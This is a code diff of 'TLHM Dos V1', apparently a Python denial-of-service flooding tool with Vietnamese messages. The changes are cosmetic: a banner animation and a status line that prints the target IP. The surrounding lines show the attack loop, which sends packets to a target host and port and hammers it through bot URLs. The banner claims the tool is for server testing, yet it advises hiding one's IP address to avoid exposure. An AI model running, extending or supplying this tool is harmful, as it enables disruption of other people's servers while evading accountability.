@@ -3,6 +3,7 @@
 from queue import Queue
 from optparse import OptionParser
 import time,sys,socket,threading,logging,urllib.request,random
+import time
 
 def user_agent():
     global uagent
@@ -40,7 +41,7 @@ def down_it(item):
             s.connect((host, int(port)))
             if s.sendto(packet, (host, int(port))):
                 s.shutdown(1)
-                print ("\033[92m", time.ctime(time.time()), "\033[0m \033[94m <--packet đã gửi! đang tấn công--> \033[0m")
+                print ("\033[92m", time.ctime(), "\033[0m \033[95m <-- Đang tấn công --> \033[0m""\033[92m IP: "+host)
             else:
                 s.shutdown(1)
                 print("\033[91mshut<->down\033[0m")
@@ -61,17 +62,19 @@ def dos2():
         item = w.get()
         bot_hammering(random.choice(bots) + "http://" + host)
         w.task_done()
-
+def print_slow1(text):
+    for char in text:
+        print(char, end='', flush=True)
+        time.sleep(0.01)  # Điều chỉnh thời gian delay tại đây
+    print()
 def usage():
-    print("\033[92m______________      /\   /\    _____  ")
-    print("\033[91m\__    ___/   |    /  |_|  \  /     \ ")
-    print("\033[93m  |    |  |   |   /         \/  \ /  \ ")
-    print("\033[92m  |    |  |   |___\    _    /    \    \ ")
-    print("\033[90m  |____|  |______ \\  | |  /\____/\_  / ")
-    print("\033[95m                 \/ \/   \/         \/    ")
-    print("\n")
-    print (''' \033[92m	TLHM Dos V1 
-    Người dùng cuối cùng phải tuân theo tất cả các luật pháp áp dụng.
+    print("\033[92m     ______________      /\   /\    _____  ")
+    print("\033[91m     \__    ___/   |    /  |_|  \  /     \ ")
+    print("\033[93m       |    |  |   |   /         \/  \ /  \ ")
+    print("\033[92m       |    |  |   |___\    _    /    \    \ ")
+    print("\033[90m       |____|  |______ \\  | |  /\____/\_  / ")
+    print("\033[95m                      \/ \/   \/         \/    ")
+    print_slow1(''' \033[92m	        <-- TLHM Dos V1 -->
     Chỉ sử dụng để kiểm thử máy chủ. Địa chỉ IP của bạn có thể bị lộ. 
     Dùng các phần mềm bảo mật fake ip các lớp để tránh bị lộ ip.
     Khuyên dùng Kali Linux.\n
